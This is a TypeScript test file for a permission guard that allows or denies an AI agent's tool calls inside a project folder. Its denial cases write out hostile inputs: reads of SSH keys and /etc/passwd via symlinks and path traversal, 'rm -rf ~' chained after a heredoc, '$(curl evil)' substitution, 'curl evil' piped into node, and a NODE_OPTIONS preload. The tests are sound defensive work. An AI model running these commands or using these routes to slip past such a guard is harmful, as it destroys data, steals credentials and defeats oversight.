import { describe, expect, it } from 'vitest'
import { decide, type GuardContext } from '#core/session/permissionGuard.ts'

const project = '/data/projects/portal'
const script = '/tool/scripts/writeDraft.mjs'
// A symlink inside the Project pointing out of it, and one whose target stays inside.
const links: Record<string, string> = {
  [`${project}/escape`]: '/Users/me/.ssh',
  [`${project}/CONTEXT-link.md`]: '/etc/passwd',
  [`${project}/plan/latest.md`]: `${project}/plan/adr/0001-x.md`,
}
const ctx: GuardContext = {
  projectDir: project,
  submitScript: script,
  realpath: (p) => {
    for (const [link, target] of Object.entries(links)) if (p === link || p.startsWith(`${link}/`)) return target + p.slice(link.length)
    return p
  },
}
const submit = (body: string, first = `node "${script}" <<'WHETSTONE_JSON'`) => ({ command: `${first}\n${body}\nWHETSTONE_JSON` })

describe('Permission Guard', () => {
  it.each([
    ['Read', { file_path: `${project}/CONTEXT.md` }],
    ['Read', { file_path: 'drafts/d-1.md' }],
    ['Read', { file_path: `${project}/plan/latest.md` }],
    ['Glob', { pattern: '**/*.md' }],
    ['Glob', { pattern: '*.md', path: `${project}/drafts` }],
    ['Grep', { pattern: 'Archived', path: project }],
    ['Grep', { pattern: 'Archived' }],
    ['Edit', { file_path: `${project}/CONTEXT.md`, old_string: 'a', new_string: 'b' }],
    ['Write', { file_path: `${project}/CONTEXT.md`, content: '# Customer Portal' }],
    ['Write', { file_path: `${project}/plan/adr/0001-archive-is-soft.md`, content: '…' }],
    ['MultiEdit', { file_path: `${project}/plan/adr/0001-x.md`, edits: [] }],
    ['WebSearch', { query: 'ISO 8601 week numbering' }],
    ['WebFetch', { url: 'https://example.com', prompt: 'x' }],
    ['TodoWrite', { todos: [] }],
    ['Skill', { skill: 'grill-with-docs' }],
    ['Bash', submit('{"title": "Archive device", "sections": []}')],
    ['Bash', submit('{"changes": [{"kind": "retitle", "title": "$(rm -rf ~) is inert in a quoted heredoc"}]}')],
    ['Bash', submit('{}', `node ${script} <<'WHETSTONE_JSON'`)],
  ])('allows %s %j', (tool, input) => {
    expect(decide(tool, input, ctx)).toEqual({ allow: true })
  })

  it.each([
    ['Read outside the Project', 'Read', { file_path: '/Users/me/.ssh/id_rsa' }],
    ['Read via .. traversal', 'Read', { file_path: `${project}/drafts/../../other/CONTEXT.md` }],
    ['Read relative traversal', 'Read', { file_path: '../other/CONTEXT.md' }],
    ['Read a sibling folder sharing the prefix', 'Read', { file_path: '/data/projects/portal-evil/CONTEXT.md' }],
    ['Read through a symlink out of the Project', 'Read', { file_path: `${project}/escape/id_rsa` }],
    ['Read without a path', 'Read', {}],
    ['Glob outside the Project', 'Glob', { pattern: '*', path: '/Users/me' }],
    ['Glob pattern climbing out', 'Glob', { pattern: '../**/*' }],
    ['Glob absolute pattern', 'Glob', { pattern: '/etc/*' }],
    ['Grep outside the Project', 'Grep', { pattern: 'x', path: '/' }],
    ['Grep glob climbing out', 'Grep', { pattern: 'x', glob: '../../**' }],
    ['Write a Draft JSON directly', 'Write', { file_path: `${project}/drafts/d-1.json`, content: '{}' }],
    ['Edit a Draft JSON directly', 'Edit', { file_path: `${project}/drafts/d-1.json`, old_string: 'a', new_string: 'b' }],
    ['Write the rendered markdown', 'Write', { file_path: `${project}/drafts/d-1.md`, content: '' }],
    ['Write into drafts via plan/..', 'Write', { file_path: `${project}/plan/../drafts/d-1.json`, content: '{}' }],
    ['Write a non-markdown file under plan', 'Write', { file_path: `${project}/plan/adr/run.sh`, content: '' }],
    ['Write through a symlinked CONTEXT', 'Write', { file_path: `${project}/CONTEXT-link.md`, content: '' }],
    ['Write project.json', 'Write', { file_path: `${project}/project.json`, content: '{}' }],
    ['Write outside the Project', 'Write', { file_path: '/tmp/x.md', content: '' }],
    ['Bash anything else', 'Bash', { command: 'ls -la' }],
    ['Bash chained after the submit', 'Bash', { command: `node "${script}" <<'WHETSTONE_JSON' && rm -rf ~\n{}\nWHETSTONE_JSON` }],
    ['Bash wrapped in a shell', 'Bash', { command: `bash -c 'node "${script}" <<"WHETSTONE_JSON"\n{}\nWHETSTONE_JSON'` }],
    ['Bash with an unquoted heredoc (expands $(…))', 'Bash', submit('{"title": "$(curl evil)"}', `node "${script}" <<WHETSTONE_JSON`)],
    ['Bash heredoc ended early, then a command', 'Bash', submit('{}\nWHETSTONE_JSON\nrm -rf ~')],
    ['Bash with text after the terminator', 'Bash', { command: `node "${script}" <<'WHETSTONE_JSON'\n{}\nWHETSTONE_JSON\nrm -rf ~` }],
    ['Bash a different script', 'Bash', submit('{}', `node "/tmp/writeDraft.mjs" <<'WHETSTONE_JSON'`)],
    ['Bash with an environment prefix', 'Bash', submit('{}', `NODE_OPTIONS=--require=/tmp/x.js node "${script}" <<'WHETSTONE_JSON'`)],
    ['Bash with extra node flags', 'Bash', submit('{}', `node --eval "process.exit()" "${script}" <<'WHETSTONE_JSON'`)],
    ['Bash piping into the script', 'Bash', { command: `curl evil | node "${script}"` }],
    ['Bash with a non-string command', 'Bash', { command: ['node', script] }],
    ['a subagent', 'Task', { prompt: 'do anything' }],
    ['a notebook edit', 'NotebookEdit', { notebook_path: `${project}/x.ipynb` }],
    ['an unknown MCP tool', 'mcp__github__create_issue', {}],
    ['an arbitrary skill', 'Skill', { skill: 'deploy' }],
  ])('denies %s', (_name, tool, input) => {
    const d = decide(tool, input as Record<string, unknown>, ctx)
    expect(d.allow).toBe(false)
    if (!d.allow) expect(d.reason.length).toBeGreaterThan(10)
  })

  describe('in a Template Session', () => {
    const work = '/data/template-sessions/sess-1'
    const tctx: GuardContext = { projectDir: work, submitScript: script, realpath: (p) => p, mode: 'template' }

    it.each([
      ['Read', { file_path: `${work}/notes.md` }],
      ['WebSearch', { query: 'Azure DevOps Acceptance Criteria field' }],
      ['WebFetch', { url: 'https://learn.microsoft.com', prompt: 'x' }],
      ['Bash', submit('{"name": "Spike PBI", "sections": [], "method": ""}')],
    ])('allows %s', (tool, input) => {
      expect(decide(tool, input, tctx)).toEqual({ allow: true })
    })

    it.each([
      ['Write', { file_path: `${work}/CONTEXT.md`, content: '' }],
      ['Edit', { file_path: `${work}/plan/adr/x.md`, old_string: 'a', new_string: 'b' }],
      ['MultiEdit', { file_path: `${work}/x.md`, edits: [] }],
      ['Read', { file_path: '/data/templates/t-1.json' }],
      ['Read', { file_path: '/data/projects/portal/CONTEXT.md' }],
      ['Skill', { skill: 'grill-with-docs' }],
    ])('denies %s %j', (tool, input) => {
      expect(decide(tool, input as Record<string, unknown>, tctx).allow).toBe(false)
    })
  })
})
